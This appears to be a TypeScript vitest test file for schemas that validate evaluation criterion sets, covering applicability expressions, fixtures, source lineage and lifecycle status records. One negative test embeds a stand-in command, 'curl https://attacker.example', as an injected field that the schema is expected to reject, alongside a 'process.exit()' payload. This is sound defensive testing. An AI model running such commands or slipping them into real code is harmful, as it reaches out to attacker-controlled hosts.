import { describe, expect, it } from "vitest";
import {
  ApplicabilityContextSchema,
  type ApplicabilityExpression,
  ApplicabilityExpressionSchema,
  CRITERION_SET_SCHEMA_VERSION,
  CRITERION_SET_STATUS_SCHEMA_VERSION,
  type CriterionSetDefinition,
  CriterionSetDefinitionSchema,
  CriterionSetSchema,
  CriterionSetStatusDefinitionSchema,
  CriterionSetStatusRecordSchema,
  ExactDecimalSchema,
  MetricExpectationSchema,
} from "./evaluation-criteria.js";
import type { SourceApplicabilityScope } from "./evaluation-source.js";

const sha = (character: string) => character.repeat(64);

const scope = {
  environmentId: "env_local",
  projectId: "prj_local",
  tenantId: "ten_local",
} as const;

const applicabilityScope = (): SourceApplicabilityScope => ({
  environments: { mode: "include", values: ["env_local"] },
  exclusions: ["consumer financial advice"],
  jurisdictions: { mode: "include", values: ["kr"] },
  locales: { mode: "include", values: ["en", "ko-kr"] },
  populations: { mode: "include", values: ["adult users"] },
  riskTiers: { mode: "include", values: ["high"] },
  taskKinds: { mode: "include", values: ["task_support"] },
});

const source = (sourceSnapshotId: string, sourceCharacter: string, reviewCharacter: string) => ({
  review: {
    definitionSha256: sha(reviewCharacter),
    sourceReviewId: `srv_${sourceSnapshotId.slice(4)}`,
  },
  source: {
    definitionSha256: sha(sourceCharacter),
    sourceSnapshotId,
  },
});

const applicability = (): ApplicabilityExpression => ({
  operands: [
    { field: "environment_id", operator: "equals", value: "env_local" },
    {
      operands: [
        { field: "locale", operator: "equals", value: "en" },
        { field: "locale", operator: "equals", value: "ko-kr" },
      ],
      operator: "anyOf",
    },
    { field: "population_tags", operator: "contains", value: "adult users" },
  ],
  operator: "allOf",
});

const fixture = (
  fixtureCaseId: string,
  caseKind: "boundary" | "negative" | "not_applicable" | "positive",
  expectedVerdict: "fail" | "not_applicable" | "pass",
  character: string,
) => ({
  caseKind,
  expectedVerdict,
  fixture: {
    definitionSha256: sha(character),
    fixtureId: `fix_${fixtureCaseId.slice(5)}`,
    fixtureVersionId: `fxv_${fixtureCaseId.slice(5)}`,
  },
  fixtureCaseId,
});

function criterionSetDefinition(): CriterionSetDefinition {
  return {
    applicabilityScope: applicabilityScope(),
    assumptions: ["The replay result contains the declared structured output"],
    changeRationale: "Initial bounded criterion set",
    criteria: [
      {
        applicability: applicability(),
        assumptions: ["The exact schema represents the required response shape"],
        claim: "The replay result conforms to the approved structured response contract.",
        counterevidence: [
          {
            definitionSha256: sha("2"),
            sourceSnapshotId: "src_counter",
          },
        ],
        counterexamples: ["A syntactically valid response can still be factually wrong"],
        criterionId: "crt_schema",
        disqualifyingConditions: ["The replay result artifact is unavailable"],
        evaluator: {
          definitionSha256: sha("4"),
          evaluatorId: "evl_schema",
          evaluatorVersionId: "evv_schema_v1",
        },
        independentQuorum: 1,
        knownAmbiguities: ["Optional extension fields are outside this criterion"],
        metric: {
          direction: "equal",
          kind: "numeric",
          metricName: "schema violation count",
          threshold: "0",
          unit: "violations",
        },
        oracle: {
          definitionSha256: sha("3"),
          oracleId: "orc_schema",
          oracleVersionId: "orv_schema_v1",
        },
        qualificationFixtures: [
          fixture("case_boundary", "boundary", "pass", "5"),
          fixture("case_negative", "negative", "fail", "6"),
          fixture("case_not_applicable", "not_applicable", "not_applicable", "7"),
          fixture("case_positive", "positive", "pass", "8"),
        ],
        requiredEvidenceClasses: ["deterministic_oracle", "replay_result", "source_snapshot"],
        severity: "high",
        thresholdRationale: "Any schema violation contradicts the bounded contract claim.",
      },
    ],
    criterionSetId: "crs_response",
    criterionSetVersionId: "csv_response_v1",
    exclusions: ["Factual correctness outside the structured schema"],
    intendedUse: "Evaluate exact replay outputs for the declared support task and environment.",
    issuer: "Example reliability authority",
    knownLimitations: ["Schema conformance does not establish factual correctness"],
    purpose: "Produce contestable non-model evidence for structured response reliability.",
    riskTier: "high",
    sources: [source("src_authoritative", "1", "a"), source("src_counter", "2", "b")],
  };
}

function firstCriterion(value: CriterionSetDefinition) {
  const criterion = value.criteria[0];
  if (!criterion) throw new Error("Expected one criterion");
  return criterion;
}

describe("safe applicability contracts", () => {
  it("accepts only typed context and a bounded data-only expression", () => {
    const expression = applicability();
    expect(ApplicabilityExpressionSchema.parse(expression)).toEqual(expression);

    const context = {
      environmentId: "env_local",
      jurisdiction: "kr",
      locale: "ko-kr",
      populationTags: ["adult users"],
      riskTier: "high",
      taskKind: "task_support",
    };
    expect(ApplicabilityContextSchema.parse(context)).toEqual(context);
  });

  it.each([
    ["arbitrary field", { field: "request.body", operator: "equals", value: "secret" }],
    ["regular expression", { field: "locale", operator: "regex", value: ".*" }],
    ["executable property", { code: "process.exit()", operator: "not" }],
    ["empty conjunction", { operands: [], operator: "allOf" }],
  ])("rejects %s", (_label, expression) => {
    expect(ApplicabilityExpressionSchema.safeParse(expression).success).toBe(false);
  });

  it("rejects excessive depth and cycles without recursively executing attacker objects", () => {
    let deep: unknown = { field: "locale", operator: "equals", value: "en" };
    for (let depth = 0; depth < 12; depth += 1) deep = { operand: deep, operator: "not" };
    expect(ApplicabilityExpressionSchema.safeParse(deep).success).toBe(false);

    const cyclic: { operand?: unknown; operator: "not" } = { operator: "not" };
    cyclic.operand = cyclic;
    expect(() => ApplicabilityExpressionSchema.safeParse(cyclic)).not.toThrow();
    expect(ApplicabilityExpressionSchema.safeParse(cyclic).success).toBe(false);
  });

  it("rejects wide expressions that exceed the total node budget", () => {
    const wide = {
      operands: Array.from({ length: 8 }, () => ({
        operands: Array.from({ length: 8 }, () => ({
          field: "locale",
          operator: "equals",
          value: "en",
        })),
        operator: "allOf",
      })),
      operator: "allOf",
    };
    expect(ApplicabilityExpressionSchema.safeParse(wide).success).toBe(false);
  });

  it("preserves missing context while rejecting ambiguous or unordered values", () => {
    expect(ApplicabilityContextSchema.safeParse({ populationTags: [] }).success).toBe(true);
    expect(
      ApplicabilityContextSchema.safeParse({ populationTags: ["beta", "alpha"] }).success,
    ).toBe(false);
    expect(
      ApplicabilityContextSchema.safeParse({ hiddenAuthorization: true, populationTags: [] })
        .success,
    ).toBe(false);
  });
});

describe("criterion contracts", () => {
  it("binds one bounded claim to exact sources, reviews, fixtures, oracle, and evaluator", () => {
    const definition = criterionSetDefinition();
    expect(CriterionSetDefinitionSchema.parse(definition)).toEqual(definition);

    const record = {
      ...definition,
      definitionSha256: sha("c"),
      publishedAt: "2026-09-01T13:00:00.000Z",
      publishedByPrincipalId: "usr_publisher",
      schemaVersion: CRITERION_SET_SCHEMA_VERSION,
      scope,
    };
    expect(CriterionSetSchema.parse(record)).toEqual(record);
  });

  it.each([
    ["positive fixture expecting failure", "positive", "fail"],
    ["negative fixture expecting pass", "negative", "pass"],
    ["not-applicable fixture expecting pass", "not_applicable", "pass"],
  ] as const)("rejects %s", (_label, caseKind, expectedVerdict) => {
    const value = criterionSetDefinition();
    const criterion = firstCriterion(value);
    criterion.qualificationFixtures[0] = fixture("case_boundary", caseKind, expectedVerdict, "5");
    expect(CriterionSetDefinitionSchema.safeParse(value).success).toBe(false);
  });

  it("requires every qualification case class and unique ordered case identities", () => {
    const missing = criterionSetDefinition();
    firstCriterion(missing).qualificationFixtures = firstCriterion(
      missing,
    ).qualificationFixtures.filter(({ caseKind }) => caseKind !== "not_applicable");
    expect(CriterionSetDefinitionSchema.safeParse(missing).success).toBe(false);

    const unordered = criterionSetDefinition();
    firstCriterion(unordered).qualificationFixtures.reverse();
    expect(CriterionSetDefinitionSchema.safeParse(unordered).success).toBe(false);
  });

  it("requires criterion, source, and evidence collections to be canonical", () => {
    const unorderedEvidence = criterionSetDefinition();
    firstCriterion(unorderedEvidence).requiredEvidenceClasses.reverse();
    expect(CriterionSetDefinitionSchema.safeParse(unorderedEvidence).success).toBe(false);

    const unorderedSources = criterionSetDefinition();
    unorderedSources.sources.reverse();
    expect(CriterionSetDefinitionSchema.safeParse(unorderedSources).success).toBe(false);

    const duplicateCriteria = criterionSetDefinition();
    duplicateCriteria.criteria.push({ ...firstCriterion(duplicateCriteria) });
    expect(CriterionSetDefinitionSchema.safeParse(duplicateCriteria).success).toBe(false);
  });

  it("rejects counterevidence outside the exact set and self-predecessor lineage", () => {
    const missingCounterevidence = criterionSetDefinition();
    firstCriterion(missingCounterevidence).counterevidence = [
      { definitionSha256: sha("d"), sourceSnapshotId: "src_missing" },
    ];
    expect(CriterionSetDefinitionSchema.safeParse(missingCounterevidence).success).toBe(false);

    const wrongCounterevidenceDigest = criterionSetDefinition();
    firstCriterion(wrongCounterevidenceDigest).counterevidence = [
      { definitionSha256: sha("9"), sourceSnapshotId: "src_counter" },
    ];
    expect(CriterionSetDefinitionSchema.safeParse(wrongCounterevidenceDigest).success).toBe(false);

    const selfPredecessor = criterionSetDefinition();
    selfPredecessor.predecessor = {
      criterionSetId: selfPredecessor.criterionSetId,
      criterionSetVersionId: selfPredecessor.criterionSetVersionId,
      definitionSha256: sha("e"),
    };
    expect(CriterionSetDefinitionSchema.safeParse(selfPredecessor).success).toBe(false);

    const crossedPredecessor = criterionSetDefinition();
    crossedPredecessor.predecessor = {
      criterionSetId: "crs_other",
      criterionSetVersionId: "csv_other_v1",
      definitionSha256: sha("e"),
    };
    expect(CriterionSetDefinitionSchema.safeParse(crossedPredecessor).success).toBe(false);
  });

  it("binds each exact source and review once", () => {
    const duplicateSource = criterionSetDefinition();
    duplicateSource.sources.push({
      review: { definitionSha256: sha("f"), sourceReviewId: "srv_alternate" },
      source: { definitionSha256: sha("1"), sourceSnapshotId: "src_authoritative" },
    });
    duplicateSource.sources.sort((left, right) =>
      `${left.source.sourceSnapshotId}:${left.review.sourceReviewId}`.localeCompare(
        `${right.source.sourceSnapshotId}:${right.review.sourceReviewId}`,
      ),
    );
    expect(CriterionSetDefinitionSchema.safeParse(duplicateSource).success).toBe(false);
  });

  it("does not reuse one exact qualification fixture under multiple case identities", () => {
    const value = criterionSetDefinition();
    const criterion = firstCriterion(value);
    const firstFixture = criterion.qualificationFixtures[0];
    const secondFixture = criterion.qualificationFixtures[1];
    if (!firstFixture || !secondFixture) throw new Error("Expected qualification fixtures");
    criterion.qualificationFixtures[1] = { ...secondFixture, fixture: firstFixture.fixture };
    expect(CriterionSetDefinitionSchema.safeParse(value).success).toBe(false);
  });

  it("rejects server provenance and executable instructions in semantic definitions", () => {
    expect(
      CriterionSetDefinitionSchema.safeParse({
        ...criterionSetDefinition(),
        publishedByPrincipalId: "usr_attacker",
      }).success,
    ).toBe(false);

    const executable = criterionSetDefinition();
    firstCriterion(executable).applicability = {
      field: "locale",
      operator: "equals",
      value: "en",
      command: "curl https://attacker.example" as never,
    } as never;
    expect(CriterionSetDefinitionSchema.safeParse(executable).success).toBe(false);
  });

  it("uses exact decimal strings and explicit metric variants", () => {
    for (const valid of ["0", "-1", "1.2500", "999999999999999999.123456789012345678"]) {
      expect(ExactDecimalSchema.safeParse(valid).success).toBe(true);
    }
    for (const invalid of ["01", "+1", "1e3", "NaN", "Infinity", "1."]) {
      expect(ExactDecimalSchema.safeParse(invalid).success).toBe(false);
    }

    expect(
      MetricExpectationSchema.safeParse({
        expected: true,
        kind: "boolean",
        metricName: "contains required disclaimer",
      }).success,
    ).toBe(true);
    expect(
      MetricExpectationSchema.safeParse({
        allowedValues: ["approved", "rejected"],
        kind: "categorical",
        metricName: "schema outcome",
      }).success,
    ).toBe(true);
    expect(
      MetricExpectationSchema.safeParse({
        allowedValues: ["rejected", "approved"],
        kind: "categorical",
        metricName: "schema outcome",
      }).success,
    ).toBe(false);
  });
});

describe("criterion set lifecycle contracts", () => {
  const criterionSet = {
    criterionSetId: "crs_response",
    criterionSetVersionId: "csv_response_v1",
    definitionSha256: sha("c"),
  } as const;

  it("appends lifecycle state without changing the criterion definition", () => {
    const definition = {
      criterionSet,
      effectiveAt: "2026-09-01T13:00:00Z",
      expiresAt: "2026-12-31T23:59:59Z",
      previousStatus: { definitionSha256: sha("e"), statusRecordId: "csr_qualified" },
      rationale: "Qualified evidence and source reviews are current.",
      status: "approved" as const,
      statusRecordId: "csr_approved",
    };
    expect(CriterionSetStatusDefinitionSchema.parse(definition)).toEqual(definition);

    const record = {
      ...definition,
      definitionSha256: sha("f"),
      recordedAt: "2026-09-01T13:00:01.000Z",
      recordedByPrincipalId: "usr_approver",
      schemaVersion: CRITERION_SET_STATUS_SCHEMA_VERSION,
      scope,
    };
    expect(CriterionSetStatusRecordSchema.parse(record)).toEqual(record);
  });

  it("requires exact successor lineage only for superseded status", () => {
    const superseded = {
      criterionSet,
      effectiveAt: "2026-09-02T00:00:00Z",
      previousStatus: { definitionSha256: sha("e"), statusRecordId: "csr_approved" },
      rationale: "A corrected criterion version is now authoritative.",
      status: "superseded" as const,
      statusRecordId: "csr_superseded",
      supersededBy: {
        criterionSetId: "crs_response",
        criterionSetVersionId: "csv_response_v2",
        definitionSha256: sha("1"),
      },
    };
    expect(CriterionSetStatusDefinitionSchema.safeParse(superseded).success).toBe(true);
    expect(
      CriterionSetStatusDefinitionSchema.safeParse({ ...superseded, supersededBy: undefined })
        .success,
    ).toBe(false);
    expect(
      CriterionSetStatusDefinitionSchema.safeParse({
        ...superseded,
        status: "approved",
      }).success,
    ).toBe(false);
    expect(
      CriterionSetStatusDefinitionSchema.safeParse({
        ...superseded,
        supersededBy: criterionSet,
      }).success,
    ).toBe(false);
    expect(
      CriterionSetStatusDefinitionSchema.safeParse({
        ...superseded,
        supersededBy: {
          criterionSetId: "crs_other",
          criterionSetVersionId: "csv_other_v2",
          definitionSha256: sha("2"),
        },
      }).success,
    ).toBe(false);
  });

  it("rejects zero-length high-precision validity and unknown lifecycle authority", () => {
    const value = {
      criterionSet,
      effectiveAt: "2026-09-01T13:00:00.0000004Z",
      expiresAt: "2026-09-01T13:00:00.0000004Z",
      rationale: "Invalid interval",
      status: "draft" as const,
      statusRecordId: "csr_invalid",
    };
    expect(CriterionSetStatusDefinitionSchema.safeParse(value).success).toBe(false);
    expect(
      CriterionSetStatusDefinitionSchema.safeParse({
        ...value,
        expiresAt: "2026-09-01T13:00:01Z",
        approvedBy: "usr_attacker",
      }).success,
    ).toBe(false);
  });

  it("requires a single append-only status chain beginning at draft", () => {
    const draft = {
      criterionSet,
      effectiveAt: "2026-09-01T12:00:00Z",
      rationale: "Initial unpublished lifecycle state",
      status: "draft" as const,
      statusRecordId: "csr_draft",
    };
    expect(CriterionSetStatusDefinitionSchema.safeParse(draft).success).toBe(true);
    expect(
      CriterionSetStatusDefinitionSchema.safeParse({
        ...draft,
        previousStatus: { definitionSha256: sha("d"), statusRecordId: "csr_earlier" },
      }).success,
    ).toBe(false);
    expect(
      CriterionSetStatusDefinitionSchema.safeParse({
        ...draft,
        status: "qualified",
      }).success,
    ).toBe(false);
    expect(
      CriterionSetStatusDefinitionSchema.safeParse({
        ...draft,
        previousStatus: { definitionSha256: sha("d"), statusRecordId: "csr_draft" },
        status: "qualified",
      }).success,
    ).toBe(false);
  });
});
